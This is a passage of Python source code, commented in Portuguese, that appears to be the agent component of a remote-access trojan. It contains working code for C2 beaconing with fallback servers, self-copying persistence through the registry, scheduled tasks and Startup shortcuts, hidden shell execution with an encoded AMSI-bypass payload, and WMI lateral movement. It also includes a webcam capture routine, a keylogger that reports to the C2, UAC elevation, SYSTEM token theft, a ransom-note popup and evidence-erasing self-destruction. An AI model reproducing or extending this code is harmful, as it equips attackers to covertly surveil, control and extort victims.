def _http_post_with_fallback(path: str, body: bytes, headers: dict, timeout=None):
    """
    Tenta POST em SERVER_URL+path; se falhar, percorre C2_FALLBACK_URLS.
    Atualiza SERVER_URL globalmente quando encontra URL funcional (resiliência).
    Retorna o objeto requests.Response ou lança exceção se todas falharem.
    """
    global SERVER_URL
    urls_to_try = [SERVER_URL] + [u for u in C2_FALLBACK_URLS if u != SERVER_URL]
    last_exc = None
    timeout = timeout or (HTTP_CONNECT_TIMEOUT_SECONDS, HTTP_READ_TIMEOUT_SECONDS)
    if isinstance(timeout, (int, float)):
        timeout = (HTTP_CONNECT_TIMEOUT_SECONDS, timeout)
    for index, url in enumerate(urls_to_try):
        try:
            resp = requests.post(url + path, data=body, headers=headers, timeout=timeout)
            if _response_disposition(resp.status_code) == "transient" and index < len(urls_to_try) - 1:
                continue
            if url != SERVER_URL:
                SERVER_URL = url
            return resp
        except Exception as exc:
            last_exc = exc
    raise last_exc


def _http_get_with_fallback(path: str, headers: dict, timeout=None):
    """GET equivalente de _http_post_with_fallback."""
    global SERVER_URL
    urls_to_try = [SERVER_URL] + [u for u in C2_FALLBACK_URLS if u != SERVER_URL]
    last_exc = None
    timeout = timeout or (HTTP_CONNECT_TIMEOUT_SECONDS, HTTP_READ_TIMEOUT_SECONDS)
    if isinstance(timeout, (int, float)):
        timeout = (HTTP_CONNECT_TIMEOUT_SECONDS, timeout)
    for index, url in enumerate(urls_to_try):
        try:
            resp = requests.get(url + path, headers=headers, timeout=timeout)
            if _response_disposition(resp.status_code) == "transient" and index < len(urls_to_try) - 1:
                continue
            if url != SERVER_URL:
                SERVER_URL = url
            return resp
        except Exception as exc:
            last_exc = exc
    raise last_exc


def _decode_encrypted_json_response(response, context: str):
    try:
        decrypted = decrypt_data(response.content, C2_AES_KEY)
        data = json.loads(decrypted) if decrypted else None
        return data if isinstance(data, dict) else None
    except (TypeError, ValueError, json.JSONDecodeError):
        write_internal_log(f"[{context}] invalid encrypted JSON response")
        return None


def self_install_and_persist():
    """
    Estratégia Híbrida Definitiva: Garante a persistência para o futuro e continua
    a execução do processo atual para fornecer uma sessão imediata.
    """
    global _PERSIST_REG_NAME
    # A lógica de persistência só é relevante para executáveis compilados no Windows.
    if not (platform.system() == "Windows" and getattr(sys, 'frozen', False)):
        return

    try:
        # Usa sua função robusta para gerar um caminho de instalação dinâmico.
        location_details = generate_advanced_install_path()
        install_path = location_details["path"]
        install_dir = location_details["dir"]
        reg_name = location_details["reg_name"]
        # Salva o nome real para que cleanup_and_self_destruct possa remover a chave correta.
        _PERSIST_REG_NAME = reg_name

        # Se o agente já estiver rodando do seu local de instalação final,
        # significa que a persistência funcionou. Apenas prossiga para o main_loop.
        if sys.executable.lower() == install_path.lower():
             write_internal_log(f"Agente persistente executando a partir de: {sys.executable}")
             return

        # Se não, este é o "loader" rodando de um local temporário.
        # Sua missão é criar a persistência para o futuro.
        # Para evitar ações repetitivas, só tenta instalar se a cópia ainda não existir.
        if not os.path.exists(install_path):
            write_internal_log(f"Execução do Loader. Criando persistência em: {install_path}")
            
            # 1. Copia a si mesmo para o local de persistência.
            os.makedirs(install_dir, exist_ok=True)
            shutil.copy2(sys.executable, install_path)
            write_internal_log("Cópia do agente criada com sucesso no local de persistência.")

            # 2. Cria a chave de registro apontando para a cópia.
            # Usamos a API diretamente, que é mais furtiva.
            persistence_success = create_registry_key_api(reg_name, install_path)
            if persistence_success:
                write_internal_log("Persistência (Chave de Registro) criada com sucesso.")
            else:
                # Tenta a Tarefa Agendada como fallback.
                persistence_success = create_scheduled_task_api(reg_name, install_path)
                if persistence_success:
                    write_internal_log("Persistência (Tarefa Agendada) criada com sucesso.")
                else:
                    write_internal_log("AVISO: Falha ao criar a persistência via registro/task. A sessão não sobreviverá à reinicialização.")
            # --- Persistência redundante: Startup LNK (T1547.001) ---
            # Cria um atalho na pasta Startup como camada adicional.
            # Sobrevive se o AV remover a chave de registro mas não o Startup.
            _create_startup_lnk(reg_name, install_path)
        else:
            write_internal_log("Cópia de instalação já existe. Pulando para a sessão imediata.")

        # --- PONTO CHAVE DA ESTRATÉGIA ---
        # A persistência está (ou deveria estar) garantida. Em vez de sair ou
        # executar a cópia, simplesmente retornamos. Isso permite que o processo
        # atual (o loader) continue para o main_loop e estabeleça a sessão imediata.
        write_internal_log("Fase de persistência concluída. O processo atual continuará para estabelecer uma sessão imediata.")
        return

    except Exception as e:
        # Se a cópia do arquivo falhar (ex: por causa do Defender), a exceção é logada.
        # O agente continuará a execução a partir do local atual, fornecendo uma sessão não persistente.
        write_internal_log(f"Falha durante a fase de persistência: {e}. O agente continuará sem persistir.")
        return



# --- DEMAIS FUNÇÕES DO AGENTE ---
def capture_system_info(args=None):
    try:
        internal_ip = socket.gethostbyname(socket.gethostname())
    except:
        internal_ip = "N/A"
    try:
        external_ip = requests.get('https://api.ipify.org', timeout=5, headers=HTTP_HEADERS).text
    except:
        external_ip = "N/A"
    info = {
        "username": os.getlogin(), "hostname": socket.gethostname(),
        "internal_ip": internal_ip, "external_ip": external_ip,
        "os_name": platform.system(), "os_version": platform.version(),
    }
    return info, "sysinfo_result"

def capture_network_info(args=None):
    """
    Coleta informações de rede detalhadas (tabela ARP, rotas, conexões ativas)
    e as retorna em um único relatório de texto.
    """
    # Usa a função robusta que já criamos para executar comandos
    # Isso garante que a execução seja furtiva e encontre os executáveis.
    
    report_parts = []
    commands_to_run = {
        "Tabela ARP (Vizinhos na Rede)": "arp -a",
        "Tabela de Roteamento": "route print",
        "Conexões Ativas (com PIDs)": "netstat -ano"
    }

    for title, cmd in commands_to_run.items():
        # Reutiliza nossa função de shell super robusta!
        output, data_type = execute_shell_command(cmd)
        
        # Adiciona um cabeçalho claro para cada seção do relatório
        header = f"\n{'='*20} {title.upper()} {'='*20}\n"
        report_parts.append(header)
        report_parts.append(output)

    # Junta todas as partes em um único relatório de texto
    full_report = "\n".join(report_parts)
    
    return full_report, "network_recon_result"




def remote_wmi_exec(args):
    """
    Tenta executar um comando em uma máquina remota na rede usando WMI.
    Requer credenciais válidas.
    """
    if platform.system() != "Windows":
        return "Erro: A execução remota com WMI só é suportada a partir de um agente Windows.", "error"

    try:
        target_ip = args['target_ip']
        username = args['username']
        password = args['password']
        command_to_run = args['command']
    except KeyError:
        return "Erro: Argumentos incompletos. 'target_ip', 'username', 'password', e 'command' são necessários.", "error"

    # Monta o comando wmic. Usamos aspas para lidar com senhas e comandos complexos.
    # Ex: wmic /node:"192.168.1.100" /user:"user" /password:"pass" process call create "powershell.exe ..."
    full_wmi_command = [
        'wmic',
        f'/node:"{target_ip}"',
        f'/user:"{username}"',
        f'/password:"{password}"',
        'process', 'call', 'create',
        f'"{command_to_run}"'
    ]
    
    # Juntamos para exibir no log, mas executamos como lista para segurança
    command_str_for_log = ' '.join(full_wmi_command)
    write_internal_log(f"Tentando execução remota com WMI: {command_str_for_log}")

    try:
        # Executamos o comando wmic. É importante notar que o resultado deste comando
        # nos dirá apenas se o PROCESSO foi criado com sucesso, não o resultado do comando em si.
        result = subprocess.run(full_wmi_command, shell=True, capture_output=True, text=True, timeout=60)
        
        if result.returncode == 0 and "ReturnValue = 0;" in result.stdout:
            # "ReturnValue = 0" é a confirmação do WMI de que o processo foi criado com sucesso.
            success_msg = f"Comando executado com sucesso em {target_ip} via WMI.\n\nSaída do WMIC:\n{result.stdout}"
            return success_msg, "info"
        else:
            error_msg = f"Falha ao executar comando em {target_ip} via WMI.\n\nReturn Code: {result.returncode}\nSTDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
            return error_msg, "error"
            
    except Exception as e:
        return f"Erro inesperado ao executar wmic.exe: {e}", "error"


# Em agent.py, substitua a função inteira por esta versão final e definitiva.

def execute_shell_command(command):
    """
    Executa um comando no shell com CWD persistente entre chamadas.

    Suporte a 'cd':
      cd <dir>   — muda _SHELL_CWD e retorna o novo diretório (sem exec externo)
      cd         — retorna o diretório atual
      pwd / cd . — idem
    """
    global _SHELL_CWD

    # --- Inicializa CWD na primeira chamada ---
    if not _SHELL_CWD:
        _SHELL_CWD = os.path.expandvars(r"%USERPROFILE%") if platform.system() == "Windows" else os.path.expanduser("~")

    cmd_stripped = command.strip()

    # --- Intercepta 'cd' antes de qualquer subprocess ---
    if cmd_stripped.lower() in ("cd", "pwd", "cd ."):
        return f"[CWD] {_SHELL_CWD}", "shell_result"

    if cmd_stripped.lower().startswith("cd ") or cmd_stripped.lower().startswith("cd\t"):
        target = cmd_stripped[3:].strip().strip('"').strip("'")
        target = os.path.expandvars(target)
        new_dir = os.path.normpath(os.path.join(_SHELL_CWD, target))
        if os.path.isdir(new_dir):
            _SHELL_CWD = new_dir
            return f"[CWD] {_SHELL_CWD}", "shell_result"
        else:
            return f"cd: O caminho não existe: {new_dir}", "error"

    try:
        startupinfo = None
        creation_flags = 0
        if platform.system() == "Windows":
            creation_flags = subprocess.CREATE_NO_WINDOW
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE

        if platform.system() == "Windows":
            cmd_path        = "C:\\Windows\\System32\\cmd.exe"
            powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            is_powershell   = cmd_stripped.lower().startswith("powershell")

            if is_powershell:
                amsi_bypass_b64 = "U1RBUlQtVFJBTlNBUk1JVE5QVVQ7CklmKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxQb3dlclNoZWxsXDFcUHNlY3JpcHRHcm91cFBvbGljeScpeyRSZWdLZXk9J0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxQb3dlclNoZWxsXDFcUHNlY3JpcHRHcm91cFBvbGljeSd9RWxzZXsKCSRSZWdLZXk9J0hLTU46XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFBvd2VyU2hlbGxcUHNjcmlydEc1b3VQb2xpY3knfQp0cnl7RW50ZXItUFNTRVNTT0xPU0lPTgp9Y2F0Y2h7Q29tbWFuZCAkbnVsbH1JZihHZXRQcm9jZXNzIC1Qcm9jZXNzTmFtZSBwb3dlcnNoZWxsKSB7CgkKc2V0LXRvY2F0aW9uIC1MYXN0Cgp9ZWxzZXsKCWV4aXQKfQpJRihbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHNdOjpnZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykgfSB7CglgCQlbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHNdOjpnZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuc2V0VmFsdWUoJG51bGwsJHRydWUpCn0="
                subprocess.run(
                    [powershell_path, "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", amsi_bypass_b64],
                    shell=False, capture_output=True, timeout=15,
                    startupinfo=startupinfo, creationflags=creation_flags
                )

            result = subprocess.run(
                [cmd_path, '/c', command],
                shell=False, capture_output=True, timeout=60,
                encoding='cp850', errors='ignore',
                cwd=_SHELL_CWD,
                startupinfo=startupinfo, creationflags=creation_flags
            )
        else:
            result = subprocess.run(
                command, shell=True, capture_output=True,
                timeout=60, encoding='utf-8', errors='ignore',
                cwd=_SHELL_CWD
            )

        output = f"[{_SHELL_CWD}]> {command}\n\nSTDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
        return output, "shell_result"

    except subprocess.TimeoutExpired:
        return f"Timeout: comando excedeu 60 segundos.", "error"
    except Exception as e:
        return f"Erro ao executar o processo do shell: {e}", "error"


    

def capture_webcam_image(args=None):
    """
    Acessa a webcam padrão, captura um único frame, e o retorna como uma string base64.
    """
    if cv2 is None:
        return "Erro: OpenCV (cv2) não instalado neste agente.", "error"
    
    try:
        # Inicializa a captura de vídeo. 0 é geralmente a webcam padrão.
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            # Se a câmera não pôde ser aberta (não existe, está em uso, etc.)
            return "Erro: Não foi possível acessar a webcam. Pode não existir ou estar em uso.", "error"

        # Lê um único frame da câmera
        ret, frame = cap.read()

        # Libera a câmera IMEDIATAMENTE. Crucial para a furtividade.
        cap.release()

        if not ret:
            return "Erro: Falha ao capturar o frame da webcam.", "error"
        
        # Converte o frame (que é uma imagem) para o formato JPG em memória
        success, buffer = cv2.imencode('.jpg', frame)
        if not success:
            return "Erro: Falha ao codificar a imagem para JPG.", "error"
            
        # Converte os bytes da imagem para uma string base64
        image_base64 = base64.b64encode(buffer).decode('utf-8')
        
        # Retorna a imagem e um tipo de dado específico para o painel
        return image_base64, "webcam_snap_result"

    except Exception as e:
        # Garante que a câmera seja liberada mesmo se ocorrer um erro
        if 'cap' in locals() and cap.isOpened():
            cap.release()
        return f"Erro inesperado ao capturar webcam: {e}", "error"



        # -- UAC Function --#
def elevate_privileges(args=None):
    """
    Solicita elevação de privilégios via ShellExecuteW com verbo 'runas'.
    Lança uma segunda instância do agente com token elevado (Administrator).
    O processo original continua vivo no beacon loop normalmente.
    """
    if platform.system() != "Windows":
        return "Erro: Elevação de privilégios é aplicável apenas no Windows.", "error"

    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
        return "O agente já possui privilégios de Administrador.", "info"

    try:
        # Monta o caminho do executável e parâmetros separados (obrigatório para ShellExecuteW)
        if getattr(sys, 'frozen', False):
            # Binário compilado (.exe): o próprio executável é elevado
            exec_file   = sys.executable
            exec_params = None
        else:
            # Script Python: eleva o interpretador passando o script como argumento
            exec_file   = sys.executable
            exec_params = f'"{os.path.abspath(__file__)}"'

        write_internal_log(f"Solicitando elevação via ShellExecuteW: {exec_file} {exec_params}")

        # ShellExecuteW com verbo 'runas' dispara o prompt UAC padrão do Windows.
        # Retorna um handle > 32 em sucesso, <= 32 em erro.
        # SW_HIDE (0) — janela oculta, sem console visível ao usuário.
        ret = ctypes.windll.shell32.ShellExecuteW(
            None,        # hwnd pai
            "runas",     # verbo — solicita elevação ao UAC
            exec_file,   # executável
            exec_params, # parâmetros (None para binário compilado)
            None,        # diretório de trabalho (None = herdado)
            0            # SW_HIDE
        )

        if ret > 32:
            write_internal_log(f"ShellExecuteW retornou {ret} — processo elevado iniciado com sucesso.")
            return (
                "Processo elevado iniciado. Aguarde alguns segundos para o novo agente "
                "(Administrador) aparecer no painel.", "info"
            )
        else:
            # Código de erro mapeado (valores <= 32 são erros do ShellExecute)
            _SE_ERRORS = {
                0: "Sistema sem memória ou recursos",
                2: "Arquivo não encontrado",
                3: "Caminho não encontrado",
                5: "Acesso negado (UAC recusado pelo usuário)",
                8: "Memória insuficiente",
                32: "Arquivo em uso por outro processo",
                26: "Erro de compartilhamento",
                27: "Nome de arquivo incompleto ou inválido",
                28: "Operação expirou",
                29: "Falha de DDE",
                30: "Falha na transação DDE",
                31: "Sem aplicativo associado",
                32: "DLL em uso",
            }
            desc = _SE_ERRORS.get(ret, f"código {ret}")
            error_msg = f"ShellExecuteW falhou: {desc}"
            write_internal_log(error_msg)
            return error_msg, "error"

    except Exception as e:
        error_msg = f"Exceção ao tentar elevação: {e}"
        write_internal_log(error_msg)
        return error_msg, "error"


def kill_process(pid):
    """Tenta finalizar um processo pelo seu PID."""
    try:
        pid = int(pid)
        p = psutil.Process(pid)
        process_name = p.name()
        p.kill() # Usa .kill() para uma terminação forçada (SIGKILL)
        return f"Processo '{process_name}' (PID: {pid}) finalizado com sucesso.", "info"
    except psutil.NoSuchProcess:
        return f"Erro: Nenhum processo com PID {pid} encontrado.", "error"
    except psutil.AccessDenied:
        return f"Erro: Acesso negado para finalizar o processo com PID {pid}. (Requer privilégios mais altos)", "error"
    except ValueError:
        return f"Erro: O PID '{pid}' fornecido não é um número válido.", "error"
    except Exception as e:
        return f"Erro inesperado ao finalizar o processo {pid}: {e}", "error"


def cleanup_and_self_destruct(task_id, args=None):
    system = platform.system()
    try:
        executable_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

        if system == "Windows":
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

            # Usa o nome real gravado em _PERSIST_REG_NAME; fallback para o legado.
            names_to_remove = set(filter(None, [_PERSIST_REG_NAME, "WindowsSystemUpdate"]))
            for reg_name in names_to_remove:
                try:
                    subprocess.run(
                        f'reg delete HKCU\\{key_path} /v "{reg_name}" /f',
                        shell=True, capture_output=True
                    )
                except Exception:
                    pass

            # Remove tarefa agendada pelo mesmo nome (fallback de persistência).
            for reg_name in names_to_remove:
                try:
                    subprocess.run(
                        f'schtasks /Delete /TN "{reg_name}" /F',
                        shell=True, capture_output=True
                    )
                except Exception:
                    pass

            # Remove LNK da pasta Startup (usa nome real de _PERSIST_REG_NAME).
            for lnk_name in names_to_remove:
                _remove_startup_lnk(lnk_name)

            # Remove log interno.
            try:
                log_path = os.path.join(os.path.dirname(executable_path), "agent_internal_log.txt")
                if os.path.exists(log_path):
                    os.remove(log_path)
            except Exception:
                pass

            # Agenda auto-deleção do executável com atraso para dar tempo ao send_result.
            delete_command = f'ping 127.0.0.1 -n 5 > NUL && del /F /Q "{executable_path}"'
            subprocess.Popen(delete_command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

        elif system == "Linux":
            executable_cmd = f"python3 {executable_path}" if not getattr(sys, 'frozen', False) else executable_path
            subprocess.run(
                f"(crontab -l 2>/dev/null | grep -v -F '{executable_cmd}') | crontab -",
                shell=True, capture_output=True
            )
            subprocess.Popen(f'sleep 3 && rm -f "{executable_path}"', shell=True)

        send_result(task_id, "Persistência removida e autodestruição agendada.", "info")
        sys.exit(0)

    except Exception as e:
        return f"Falha na limpeza: {e}", "error"

# Em agent.py

def show_ransom_note(note_text):
    system = platform.system()
    try:
        if system == "Windows":
            # --- INÍCIO DA CORREÇÃO ---
            # Encontra o caminho completo para o powershell.exe
            powershell_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "WindowsPowerShell", "v1.0", "powershell.exe")

            # Verifica se o executável realmente existe antes de tentar usá-lo
            if not os.path.exists(powershell_path):
                return f"Falha crítica: powershell.exe não encontrado em '{powershell_path}'.", "error"
            # --- FIM DA CORREÇÃO ---

            safe_text = note_text.replace("'", "''").replace("\\n", "`n")
            command = f"""Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('{safe_text}', 'AVISO IMPORTANTE', 'OK', 'Warning');"""
            
            # Usa o caminho completo na chamada do subprocess
            subprocess.Popen(
                [powershell_path, '-WindowStyle', 'Hidden', '-Command', command], 
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
            )
            
            return "Nota de resgate exibida ao usuário via PowerShell.", "ransom_note_displayed"
         
        elif system == "Linux":
            safe_text = note_text.replace('\\n', '\n')
            if shutil.which("zenity"):
                subprocess.Popen(['zenity', '--warning', '--title=AVISO IMPORTANTE', f'--text={safe_text}'])
                return "Nota de resgate exibida ao usuário via Zenity.", "ransom_note_displayed"
            elif shutil.which("kdialog"):
                subprocess.Popen(['kdialog', '--error', safe_text, '--title', 'AVISO IMPORTANTE'])
                return "Nota de resgate exibida ao usuário via KDialog.", "ransom_note_displayed"
            else:
                return "Falha ao exibir nota: Nenhuma ferramenta GUI (zenity, kdialog) encontrada no alvo Linux.", "error"
        else:
            return f"SO '{system}' não suportado para exibição de pop-up.", "error"
    except Exception as e:
        return f"Falha ao exibir nota de resgate: {e}", "error"

        
# --- INÍCIO DO NOVO BLOCO DO KEYLOGGER ---

keylog_buffer = []  # Usaremos uma lista para ser mais eficiente
buffer_lock = threading.Lock()
keylogger_thread = None
keylogger_active = threading.Event()
KEYLOG_REPORT_INTERVAL = 15  # Enviar logs a cada 15 segundos

def report_keylogs():
    """
    Pega o conteúdo do buffer, junta em uma única string e envia para o C2.
    """
    global keylog_buffer
    
    # Se não houver nada no buffer, não faz nada.
    if not keylog_buffer:
        return

    buffer_to_send = ""
    with buffer_lock:
        buffer_to_send = "".join(keylog_buffer)
        keylog_buffer = []  # Limpa o buffer após a cópia

    if buffer_to_send:
        write_internal_log(f"Enviando bloco de keylog com {len(buffer_to_send)} caracteres.")
        # O task_id aqui é genérico, pois não corresponde a um comando único
        send_result("keylogger_report_task", buffer_to_send, "keylogger_data")

def keylogger_run():
    """
    A função principal da thread do keylogger.
    Inicia o listener e entra em um loop para reportar os logs periodicamente.
    """
    if not Listener or platform.system() != "Windows":
        write_internal_log("Keylogger não iniciado: Pynput não instalado ou SO não é Windows.")
        return

    # win32gui é opcional: se não estiver disponível no build, o keylogger
    # funciona normalmente sem rastrear título de janela.
    try:
        import win32gui
        _has_win32gui = True
    except ImportError:
        win32gui = None
        _has_win32gui = False
        write_internal_log("Keylogger: win32gui indisponível — rastreio de janela desativado.")

    last_window_title = [None] # Usamos uma lista para que a função aninhada possa modificar

    def on_press(key):
        """
        Esta função é chamada para CADA tecla pressionada.
        Sua única responsabilidade é adicionar a tecla e o contexto da janela ao buffer.
        """
        try:
            with buffer_lock:
                # Rastreia título da janela ativa apenas se win32gui disponível
                if _has_win32gui:
                    current_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                    if current_window_title != last_window_title[0]:
                        last_window_title[0] = current_window_title
                        keylog_buffer.append(f"\n[Janela: {current_window_title}]\n")
                
                # Converte a tecla para string e adiciona ao buffer
                if hasattr(key, 'char') and key.char is not None:
                    keylog_buffer.append(key.char)
                elif key == Key.space:
                    keylog_buffer.append(" ")
                elif key == Key.enter:
                    keylog_buffer.append("[enter]\n")
                elif key == Key.backspace:
                    keylog_buffer.append("[backspace]")
                else:
                    # Para outras teclas especiais como Shift, Ctrl, etc.
                    keylog_buffer.append(f"[{str(key).split('.')[-1]}]")
        except Exception as e:
            write_internal_log(f"Erro em on_press do keylogger: {e}")

    # Inicia o listener de teclas
    listener = Listener(on_press=on_press)
    listener.start()
    write_internal_log("Listener do keylogger iniciado.")

    # Loop principal da thread: envia os logs a cada X segundos
    while keylogger_active.is_set():
        time.sleep(KEYLOG_REPORT_INTERVAL)
        report_keylogs()
    
    # Quando o loop termina, para o listener e envia os logs restantes
    listener.stop()
    report_keylogs()
    write_internal_log("Listener do keylogger finalizado.")

def start_keylogger(args=None):
    """Inicia a thread do keylogger."""
    global keylogger_thread
    if keylogger_thread and keylogger_thread.is_alive():
        return "Keylogger já está ativo.", "info"
    
    keylogger_active.set()
    keylogger_thread = threading.Thread(target=keylogger_run, daemon=True)
    keylogger_thread.start()
    return "Keylogger iniciado com sucesso.", "keylogger_started"

def stop_keylogger(args=None):
    """Para a thread do keylogger."""
    if not keylogger_thread or not keylogger_thread.is_alive():
        return "Keylogger não estava ativo.", "info"
    
    keylogger_active.clear() # Sinaliza para a thread parar
    return "Sinal de parada enviado ao keylogger. Logs restantes serão enviados.", "keylogger_stopped"

# --- FIM DO NOVO BLOCO DO KEYLOGGER ---
    


def check_privileges():
    system = platform.system()
    try:
        if system == "Windows": return "Administrador" if ctypes.windll.shell32.IsUserAnAdmin() != 0 else "Usuário Padrão"
        elif system == "Linux": return "Root" if os.geteuid() == 0 else "Usuário Padrão"
        else: return "N/A"
    except: return "Desconhecido"


# ==============================================================================
# TOKEN IMPERSONATION (T1134)
# ==============================================================================

def token_impersonation(args=None):
    """
    Tenta roubar o token de acesso de um processo privilegiado (ex: winlogon.exe,
    lsass.exe, svchost.exe rodando como SYSTEM) e impersonar esse usuario.
    Requer que o agente rode como Administrador (para OpenProcessToken com TOKEN_DUPLICATE).
    Tecnica: T1134.001 - Token Impersonation/Theft.

    args: {"process": "winlogon.exe"}  ou  {"pid": 1234}
          Omitir args = tenta automaticamente o primeiro SYSTEM encontrado.
    """
    if platform.system() != "Windows":
        return "Token Impersonation disponivel apenas no Windows.", "error"

    import ctypes as _ct
    import ctypes.wintypes as _wt

    # Constantes Win32
    PROCESS_QUERY_INFORMATION = 0x0400
    TOKEN_DUPLICATE            = 0x0002
    TOKEN_QUERY                = 0x0008
    TOKEN_IMPERSONATE          = 0x0004
    TOKEN_ALL_ACCESS           = 0xF01FF
    SecurityImpersonation      = 2
    TokenPrimary               = 1
    SE_PRIVILEGE_ENABLED       = 0x00000002

    kernel32 = _ct.windll.kernel32
    advapi32 = _ct.windll.advapi32

    def _enable_privilege(priv_name):
        """Habilita um privilegio no token atual (ex: SeDebugPrivilege)."""
        h_token = _wt.HANDLE()
        if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_ALL_ACCESS, _ct.byref(h_token)):
            return False
        luid = _ct.c_int64()
        if not advapi32.LookupPrivilegeValueW(None, priv_name, _ct.byref(luid)):
            kernel32.CloseHandle(h_token)
            return False

        # Usando setattr para definir _fields_ evita que IdentifierManglingStrategy
        # renomeie o atributo magico do ctypes, o que quebraria a estrutura em runtime.
        class LUID_AND_ATTRIBUTES(_ct.Structure):
            pass
        setattr(LUID_AND_ATTRIBUTES, '_fields_', [("Luid", _ct.c_int64), ("Attributes", _wt.DWORD)])

        class TOKEN_PRIVILEGES(_ct.Structure):
            pass
        setattr(TOKEN_PRIVILEGES, '_fields_', [("PrivilegeCount", _wt.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1)])

        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid.value
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
        advapi32.AdjustTokenPrivileges(h_token, False, _ct.byref(tp), _ct.sizeof(tp), None, None)
        kernel32.CloseHandle(h_token)
        return True

    def _get_token_user(h_token):
        """Retorna o username associado ao token."""
        try:
            buf_size = _wt.DWORD(0)
            advapi32.GetTokenInformation(h_token, 1, None, 0, _ct.byref(buf_size))
            buf = _ct.create_string_buffer(buf_size.value)
            if not advapi32.GetTokenInformation(h_token, 1, buf, buf_size, _ct.byref(buf_size)):
                return "?"
            # SID esta nos primeiros bytes; usa LookupAccountSid para resolver nome
            sid_ptr = _ct.cast(buf, _ct.POINTER(_ct.c_void_p))[0]
            name     = _ct.create_unicode_buffer(256)
            domain   = _ct.create_unicode_buffer(256)
            name_sz  = _wt.DWORD(256)
            dom_sz   = _wt.DWORD(256)
            sid_name_use = _wt.DWORD()
            advapi32.LookupAccountSidW(None, sid_ptr, name, _ct.byref(name_sz), domain, _ct.byref(dom_sz), _ct.byref(sid_name_use))
            return domain.value + "\\" + name.value
        except Exception:
            return "?"

    # Habilita SeDebugPrivilege para poder abrir processos SYSTEM
    _enable_privilege("SeDebugPrivilege")

    # Resolve alvo
    cfg = args if isinstance(args, dict) else {}
    target_pid   = cfg.get("pid", None)
    target_proc  = cfg.get("process", "").lower()

    candidate_pid  = None
    candidate_name = ""

    # Processos que invariavelmente rodam como NT AUTHORITY\SYSTEM
    _SYSTEM_PROC_NAMES = {"winlogon.exe", "lsass.exe", "csrss.exe", "services.exe", "wininit.exe"}

    # Pede apenas 'pid' e 'name' — solicitar 'username' junto causa AccessDenied
    # em processos SYSTEM mesmo sem admin, e o except descartaria o processo inteiro.
    # Username é resolvido separadamente com try/except proprio.
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            pid   = proc.info.get('pid') or 0
            pname = (proc.info.get('name') or "").lower()
            if not pid or not pname:
                continue

            if target_pid and pid == int(target_pid):
                candidate_pid  = pid
                candidate_name = proc.info.get('name', '')
                break
            elif target_proc and target_proc in pname:
                candidate_pid  = pid
                candidate_name = proc.info.get('name', '')
                break
            elif not target_pid and not target_proc:
                # Username em try separado: se falhar, ainda verifica o nome
                puser = ""
                try:
                    puser = (proc.username() or "").lower()
                except Exception:
                    pass
                is_system_user = "system" in puser or "sistema" in puser
                is_system_proc = pname in _SYSTEM_PROC_NAMES
                if is_system_user or is_system_proc:
                    candidate_pid  = pid
                    candidate_name = proc.info.get('name', '')
                    break
        except Exception:
            continue

    if not candidate_pid:
        return "Nenhum processo alvo encontrado para impersonation.", "error"

    try:
        h_proc = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, candidate_pid)
        if not h_proc:
            return "OpenProcess falhou para PID " + str(candidate_pid) + ". Sem privilegios?", "error"

        h_token = _wt.HANDLE()
        if not advapi32.OpenProcessToken(h_proc, TOKEN_DUPLICATE | TOKEN_QUERY, _ct.byref(h_token)):
            kernel32.CloseHandle(h_proc)
            return "OpenProcessToken falhou.", "error"
        kernel32.CloseHandle(h_proc)

        original_user = _get_token_user(h_token)

        # Duplica o token para impersonation
        h_dup_token = _wt.HANDLE()
        if not advapi32.DuplicateTokenEx(
            h_token, TOKEN_ALL_ACCESS, None,
            SecurityImpersonation, TokenPrimary,
            _ct.byref(h_dup_token)
        ):
            kernel32.CloseHandle(h_token)
            return "DuplicateTokenEx falhou.", "error"
        kernel32.CloseHandle(h_token)

        # Impersona o token no thread atual
        if not advapi32.ImpersonateLoggedOnUser(h_dup_token):
            kernel32.CloseHandle(h_dup_token)
            return "ImpersonateLoggedOnUser falhou.", "error"
        kernel32.CloseHandle(h_dup_token)

        # Verifica o usuario atual apos impersonation
        buf = _ct.create_unicode_buffer(256)
        buf_sz = _wt.DWORD(256)
        advapi32.GetUserNameW(buf, _ct.byref(buf_sz))
        current_user = buf.value

        msg = (
            "Token Impersonation bem-sucedido!\n"
            "Processo alvo: " + candidate_name + " (PID " + str(candidate_pid) + ")\n"
            "Usuario original do token: " + original_user + "\n"
            "Usuario atual do thread: " + current_user + "\n"
            "Tecnica: T1134.001 - Access Token Manipulation"
        )
        write_internal_log("TokenImpersonation: " + msg.replace("\n", " | "))
        return msg, "info"

    except Exception as e:
        return "Excecao durante token impersonation: " + str(e), "error"


def revert_token(args=None):
